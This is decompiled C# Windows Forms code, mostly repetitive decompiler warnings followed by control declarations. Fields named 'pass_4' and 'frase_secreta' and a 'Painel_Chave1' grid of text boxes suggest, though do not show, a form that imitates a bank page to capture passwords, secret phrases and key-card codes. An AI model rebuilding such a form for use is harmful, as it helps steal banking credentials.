		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ba: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f1: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Expected O, but got Unknown
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ac: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Expected O, but got Unknown
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cd: Expected O, but got Unknown
		//IL_03ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Expected O, but got Unknown
		//IL_03d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e3: Expected O, but got Unknown
		//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ee: Expected O, but got Unknown
		//IL_03ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f9: Expected O, but got Unknown
		//IL_03fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0404: Expected O, but got Unknown
		//IL_0405: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_0410: Unknown result type (might be due to invalid IL or missing references)
		//IL_041a: Expected O, but got Unknown
		//IL_041b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0425: Expected O, but got Unknown
		//IL_0426: Unknown result type (might be due to invalid IL or missing references)
		//IL_0430: Expected O, but got Unknown
		//IL_0431: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Expected O, but got Unknown
		//IL_043c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0446: Expected O, but got Unknown
		//IL_0447: Unknown result type (might be due to invalid IL or missing references)
		//IL_0451: Expected O, but got Unknown
		//IL_0452: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0467: Expected O, but got Unknown
		//IL_0468: Unknown result type (might be due to invalid IL or missing references)
		//IL_0472: Expected O, but got Unknown
		//IL_0473: Unknown result type (might be due to invalid IL or missing references)
		//IL_047d: Expected O, but got Unknown
		//IL_047e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0488: Expected O, but got Unknown
		//IL_0489: Unknown result type (might be due to invalid IL or missing references)
		//IL_0493: Expected O, but got Unknown
		//IL_0494: Unknown result type (might be due to invalid IL or missing references)
		//IL_049e: Expected O, but got Unknown
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a9: Expected O, but got Unknown
		//IL_04aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b4: Expected O, but got Unknown
		//IL_04b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bf: Expected O, but got Unknown
		//IL_04c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ca: Expected O, but got Unknown
		//IL_04cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d5: Expected O, but got Unknown
		//IL_04d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e0: Expected O, but got Unknown
		//IL_04e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04eb: Expected O, but got Unknown
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f6: Expected O, but got Unknown
		//IL_04f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0501: Expected O, but got Unknown
		//IL_0502: Unknown result type (might be due to invalid IL or missing references)
		//IL_050c: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0517: Expected O, but got Unknown
		//IL_0518: Unknown result type (might be due to invalid IL or missing references)
		//IL_0522: Expected O, but got Unknown
		//IL_0523: Unknown result type (might be due to invalid IL or missing references)
		//IL_052d: Expected O, but got Unknown
		//IL_052e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0538: Expected O, but got Unknown
		//IL_0539: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Expected O, but got Unknown
		//IL_0544: Unknown result type (might be due to invalid IL or missing references)
		//IL_054e: Expected O, but got Unknown
		//IL_054f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0559: Expected O, but got Unknown
		//IL_055a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0564: Expected O, but got Unknown
		//IL_0565: Unknown result type (might be due to invalid IL or missing references)
		//IL_056f: Expected O, but got Unknown
		//IL_0570: Unknown result type (might be due to invalid IL or missing references)
		//IL_057a: Expected O, but got Unknown
		//IL_057b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0585: Expected O, but got Unknown
		//IL_0586: Unknown result type (might be due to invalid IL or missing references)
		//IL_0590: Expected O, but got Unknown
		//IL_0591: Unknown result type (might be due to invalid IL or missing references)
		//IL_059b: Expected O, but got Unknown
		//IL_059c: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a6: Expected O, but got Unknown
		//IL_05a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b1: Expected O, but got Unknown
		//IL_05b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bc: Expected O, but got Unknown
		//IL_05bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c7: Expected O, but got Unknown
		//IL_05c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d2: Expected O, but got Unknown
		//IL_0890: Unknown result type (might be due to invalid IL or missing references)
		//IL_089a: Expected O, but got Unknown
		//IL_093f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0949: Expected O, but got Unknown
		//IL_09e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f3: Expected O, but got Unknown
		//IL_0a6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a74: Expected O, but got Unknown
		//IL_1100: Unknown result type (might be due to invalid IL or missing references)
		//IL_110a: Expected O, but got Unknown
		//IL_112b: Unknown result type (might be due to invalid IL or missing references)
		//IL_117f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1189: Expected O, but got Unknown
		//IL_11a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_11af: Expected O, but got Unknown
		//IL_11d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1224: Unknown result type (might be due to invalid IL or missing references)
		//IL_122e: Expected O, but got Unknown
		//IL_124a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1254: Expected O, but got Unknown
		//IL_1275: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d3: Expected O, but got Unknown
		//IL_12ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f9: Expected O, but got Unknown
		//IL_131a: Unknown result type (might be due to invalid IL or missing references)
		//IL_136e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1378: Expected O, but got Unknown
		//IL_1394: Unknown result type (might be due to invalid IL or missing references)
		//IL_139e: Expected O, but got Unknown
		//IL_13bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_1413: Unknown result type (might be due to invalid IL or missing references)
		//IL_141d: Expected O, but got Unknown
		//IL_1439: Unknown result type (might be due to invalid IL or missing references)
		//IL_1443: Expected O, but got Unknown
		//IL_1464: Unknown result type (might be due to invalid IL or missing references)
		//IL_14b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_14c2: Expected O, but got Unknown
		//IL_14de: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e8: Expected O, but got Unknown
		//IL_1509: Unknown result type (might be due to invalid IL or missing references)
		//IL_155d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1567: Expected O, but got Unknown
		//IL_1583: Unknown result type (might be due to invalid IL or missing references)
		//IL_158d: Expected O, but got Unknown
		//IL_15ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_1602: Unknown result type (might be due to invalid IL or missing references)
		//IL_160c: Expected O, but got Unknown
		//IL_1628: Unknown result type (might be due to invalid IL or missing references)
		//IL_1632: Expected O, but got Unknown
		//IL_1653: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_16b1: Expected O, but got Unknown
		//IL_16cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_16d7: Expected O, but got Unknown
		//IL_16f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_174c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1756: Expected O, but got Unknown
		//IL_1772: Unknown result type (might be due to invalid IL or missing references)
		//IL_177c: Expected O, but got Unknown
		//IL_179d: Unknown result type (might be due to invalid IL or missing references)
		//IL_17f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_17fb: Expected O, but got Unknown
		//IL_1817: Unknown result type (might be due to invalid IL or missing references)
		//IL_1821: Expected O, but got Unknown
		//IL_1842: Unknown result type (might be due to invalid IL or missing references)
		//IL_1896: Unknown result type (might be due to invalid IL or missing references)
		//IL_18a0: Expected O, but got Unknown
		//IL_18bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_18c6: Expected O, but got Unknown
		//IL_18e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_193b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1945: Expected O, but got Unknown
		//IL_1961: Unknown result type (might be due to invalid IL or missing references)
		//IL_196b: Expected O, but got Unknown
		//IL_198c: Unknown result type (might be due to invalid IL or missing references)
		//IL_19e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_19ea: Expected O, but got Unknown
		//IL_1a06: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a10: Expected O, but got Unknown
		//IL_1a31: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a85: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a8f: Expected O, but got Unknown
		//IL_1aab: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ab5: Expected O, but got Unknown
		//IL_1ad6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b34: Expected O, but got Unknown
		//IL_1b50: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b5a: Expected O, but got Unknown
		//IL_1b7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bd9: Expected O, but got Unknown
		//IL_1bf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bff: Expected O, but got Unknown
		//IL_1c20: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c74: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c7e: Expected O, but got Unknown
		//IL_1c9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ca4: Expected O, but got Unknown
		//IL_1cc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d19: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d23: Expected O, but got Unknown
		//IL_1d3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d49: Expected O, but got Unknown
		//IL_1d6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc8: Expected O, but got Unknown
		//IL_1de4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dee: Expected O, but got Unknown
		//IL_1e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e6d: Expected O, but got Unknown
		//IL_1e89: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e93: Expected O, but got Unknown
		//IL_1eb4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f08: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f12: Expected O, but got Unknown
		//IL_1f2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f38: Expected O, but got Unknown
		//IL_1f59: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fad: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fb7: Expected O, but got Unknown
		//IL_1fd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fdd: Expected O, but got Unknown
		//IL_1ffe: Unknown result type (might be due to invalid IL or missing references)
		//IL_2052: Unknown result type (might be due to invalid IL or missing references)
		//IL_205c: Expected O, but got Unknown
		//IL_2078: Unknown result type (might be due to invalid IL or missing references)
		//IL_2082: Expected O, but got Unknown
		//IL_20a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_20f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2101: Expected O, but got Unknown
		//IL_211d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2127: Expected O, but got Unknown
		//IL_2148: Unknown result type (might be due to invalid IL or missing references)
		//IL_219c: Unknown result type (might be due to invalid IL or missing references)
		//IL_21a6: Expected O, but got Unknown
		//IL_21c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_21cc: Expected O, but got Unknown
		//IL_21ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_2241: Unknown result type (might be due to invalid IL or missing references)
		//IL_224b: Expected O, but got Unknown
		//IL_2267: Unknown result type (might be due to invalid IL or missing references)
		//IL_2271: Expected O, but got Unknown
		//IL_2292: Unknown result type (might be due to invalid IL or missing references)
		//IL_22e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_22f0: Expected O, but got Unknown
		//IL_230c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2316: Expected O, but got Unknown
		//IL_2337: Unknown result type (might be due to invalid IL or missing references)
		//IL_238b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2395: Expected O, but got Unknown
		//IL_23b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_23bb: Expected O, but got Unknown
		//IL_23dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2430: Unknown result type (might be due to invalid IL or missing references)
		//IL_243a: Expected O, but got Unknown
		//IL_2456: Unknown result type (might be due to invalid IL or missing references)
		//IL_2460: Expected O, but got Unknown
		//IL_2481: Unknown result type (might be due to invalid IL or missing references)
		//IL_24d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_24df: Expected O, but got Unknown
		//IL_24fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2505: Expected O, but got Unknown
		//IL_2526: Unknown result type (might be due to invalid IL or missing references)
		//IL_257a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2584: Expected O, but got Unknown
		//IL_25a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_25aa: Expected O, but got Unknown
		//IL_25c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_261c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2626: Expected O, but got Unknown
		//IL_2642: Unknown result type (might be due to invalid IL or missing references)
		//IL_264c: Expected O, but got Unknown
		//IL_266a: Unknown result type (might be due to invalid IL or missing references)
		//IL_26be: Unknown result type (might be due to invalid IL or missing references)
		//IL_26c8: Expected O, but got Unknown
		//IL_26e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_26ee: Expected O, but got Unknown
		//IL_270c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2760: Unknown result type (might be due to invalid IL or missing references)
		//IL_276a: Expected O, but got Unknown
		//IL_2786: Unknown result type (might be due to invalid IL or missing references)
		//IL_2790: Expected O, but got Unknown
		//IL_27ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_2802: Unknown result type (might be due to invalid IL or missing references)
		//IL_280c: Expected O, but got Unknown
		//IL_2828: Unknown result type (might be due to invalid IL or missing references)
		//IL_2832: Expected O, but got Unknown
		//IL_2850: Unknown result type (might be due to invalid IL or missing references)
		//IL_28a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_28ae: Expected O, but got Unknown
		//IL_28ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_28d4: Expected O, but got Unknown
		//IL_28f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2946: Unknown result type (might be due to invalid IL or missing references)
		//IL_2950: Expected O, but got Unknown
		//IL_296c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2976: Expected O, but got Unknown
		//IL_2994: Unknown result type (might be due to invalid IL or missing references)
		//IL_29e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_29f2: Expected O, but got Unknown
		//IL_2a0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a18: Expected O, but got Unknown
		//IL_2a36: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a94: Expected O, but got Unknown
		//IL_2ab0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aba: Expected O, but got Unknown
		//IL_2adb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b39: Expected O, but got Unknown
		//IL_2b55: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b5f: Expected O, but got Unknown
		//IL_2b80: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bd4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bde: Expected O, but got Unknown
		//IL_2bfa: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c04: Expected O, but got Unknown
		//IL_2c25: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c79: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c83: Expected O, but got Unknown
		//IL_2c9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca9: Expected O, but got Unknown
		//IL_2cca: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d28: Expected O, but got Unknown
		//IL_2d44: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d4e: Expected O, but got Unknown
		//IL_2d6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dcd: Expected O, but got Unknown
		//IL_2de9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2df3: Expected O, but got Unknown
		//IL_2e14: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e68: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e72: Expected O, but got Unknown
		//IL_2e8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e98: Expected O, but got Unknown
		//IL_2eb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f17: Expected O, but got Unknown
		//IL_2f33: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f3d: Expected O, but got Unknown
		//IL_2f5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fbc: Expected O, but got Unknown
		//IL_2fd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fe2: Expected O, but got Unknown
		//IL_3000: Unknown result type (might be due to invalid IL or missing references)
		//IL_3054: Unknown result type (might be due to invalid IL or missing references)
		//IL_305e: Expected O, but got Unknown
		//IL_307a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3084: Expected O, but got Unknown
		//IL_30a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_30f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3100: Expected O, but got Unknown
		//IL_311c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3126: Expected O, but got Unknown
		//IL_3147: Unknown result type (might be due to invalid IL or missing references)
		//IL_319b: Unknown result type (might be due to invalid IL or missing references)
		//IL_31a5: Expected O, but got Unknown
		//IL_31c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_31cb: Expected O, but got Unknown
		//IL_31ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_3240: Unknown result type (might be due to invalid IL or missing references)
		//IL_324a: Expected O, but got Unknown
		//IL_3266: Unknown result type (might be due to invalid IL or missing references)
		//IL_3270: Expected O, but got Unknown
		//IL_3291: Unknown result type (might be due to invalid IL or missing references)
		//IL_32e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_32ef: Expected O, but got Unknown
		//IL_330b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3315: Expected O, but got Unknown
		//IL_3336: Unknown result type (might be due to invalid IL or missing references)
		//IL_338a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3394: Expected O, but got Unknown
		//IL_33b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_33ba: Expected O, but got Unknown
		//IL_33db: Unknown result type (might be due to invalid IL or missing references)
		//IL_342f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3439: Expected O, but got Unknown
		//IL_3455: Unknown result type (might be due to invalid IL or missing references)
		//IL_345f: Expected O, but got Unknown
		//IL_3480: Unknown result type (might be due to invalid IL or missing references)
		//IL_34d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_34de: Expected O, but got Unknown
		//IL_34fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3504: Expected O, but got Unknown
		//IL_3525: Unknown result type (might be due to invalid IL or missing references)
		//IL_3579: Unknown result type (might be due to invalid IL or missing references)
		//IL_3583: Expected O, but got Unknown
		//IL_359f: Unknown result type (might be due to invalid IL or missing references)
		//IL_35a9: Expected O, but got Unknown
		//IL_35ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_361e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3628: Expected O, but got Unknown
		//IL_3644: Unknown result type (might be due to invalid IL or missing references)
		//IL_364e: Expected O, but got Unknown
		//IL_366c: Unknown result type (might be due to invalid IL or missing references)
		//IL_36c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_36ca: Expected O, but got Unknown
		//IL_36e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_36f0: Expected O, but got Unknown
		//IL_370e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3762: Unknown result type (might be due to invalid IL or missing references)
		//IL_376c: Expected O, but got Unknown
		//IL_3788: Unknown result type (might be due to invalid IL or missing references)
		//IL_3792: Expected O, but got Unknown
		//IL_37b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3807: Unknown result type (might be due to invalid IL or missing references)
		//IL_3811: Expected O, but got Unknown
		//IL_382d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3837: Expected O, but got Unknown
		//IL_3858: Unknown result type (might be due to invalid IL or missing references)
		//IL_38ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_38b5: Expected O, but got Unknown
		//IL_38d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_38db: Expected O, but got Unknown
		//IL_38fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_394f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3959: Expected O, but got Unknown
		//IL_3975: Unknown result type (might be due to invalid IL or missing references)
		//IL_397f: Expected O, but got Unknown
		//IL_39a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_39f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_39fd: Expected O, but got Unknown
		//IL_3a19: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a23: Expected O, but got Unknown
		//IL_3a44: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_3aa1: Expected O, but got Unknown
		//IL_3abd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ac7: Expected O, but got Unknown
		//IL_3ae8: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b45: Expected O, but got Unknown
		//IL_3b61: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b6b: Expected O, but got Unknown
		//IL_3b8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bdf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3be9: Expected O, but got Unknown
		//IL_3c05: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c0f: Expected O, but got Unknown
		//IL_3c30: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c8d: Expected O, but got Unknown
		//IL_3ca9: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cb3: Expected O, but got Unknown
		//IL_3cd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d24: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d2e: Expected O, but got Unknown
		//IL_3d4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d54: Expected O, but got Unknown
		//IL_3d72: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dcf: Expected O, but got Unknown
		//IL_3df0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dfa: Expected O, but got Unknown
		//IL_3e84: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e8e: Expected O, but got Unknown
		//IL_4000: Unknown result type (might be due to invalid IL or missing references)
		//IL_400a: Expected O, but got Unknown
		//IL_4039: Unknown result type (might be due to invalid IL or missing references)
		//IL_4043: Expected O, but got Unknown
		//IL_46a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_46af: Expected O, but got Unknown
		//IL_5daa: Unknown result type (might be due to invalid IL or missing references)
		//IL_5db4: Expected O, but got Unknown
		//IL_5e5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_5e68: Expected O, but got Unknown
		//IL_5efb: Unknown result type (might be due to invalid IL or missing references)
		//IL_5f05: Expected O, but got Unknown
		//IL_603c: Unknown result type (might be due to invalid IL or missing references)
		//IL_6046: Expected O, but got Unknown
		//IL_6191: Unknown result type (might be due to invalid IL or missing references)
		//IL_619b: Expected O, but got Unknown
		//IL_6515: Unknown result type (might be due to invalid IL or missing references)
		//IL_651f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Brdsc));
		pass_4 = new TextBox();
		frase_secreta = new TextBox();
		textBox3 = new TextBox();
		Painel_Chave1 = new Panel();
		textBox74 = new TextBox();
		textBox64 = new TextBox();
		textBox54 = new TextBox();
		textBox35 = new TextBox();
		textBox73 = new TextBox();
		textBox63 = new TextBox();
		textBox53 = new TextBox();
		textBox36 = new TextBox();
		textBox72 = new TextBox();
		textBox62 = new TextBox();
		textBox52 = new TextBox();
		textBox37 = new TextBox();
		textBox71 = new TextBox();
		textBox61 = new TextBox();
		textBox51 = new TextBox();
		textBox38 = new TextBox();
		textBox70 = new TextBox();
		textBox60 = new TextBox();
		textBox50 = new TextBox();
		textBox39 = new TextBox();
		textBox69 = new TextBox();
		textBox59 = new TextBox();
		textBox49 = new TextBox();
		textBox40 = new TextBox();
		textBox68 = new TextBox();
		textBox58 = new TextBox();
		textBox48 = new TextBox();
		textBox41 = new TextBox();
		textBox67 = new TextBox();
		textBox57 = new TextBox();
		textBox47 = new TextBox();
		textBox42 = new TextBox();
		textBox66 = new TextBox();
		textBox65 = new TextBox();
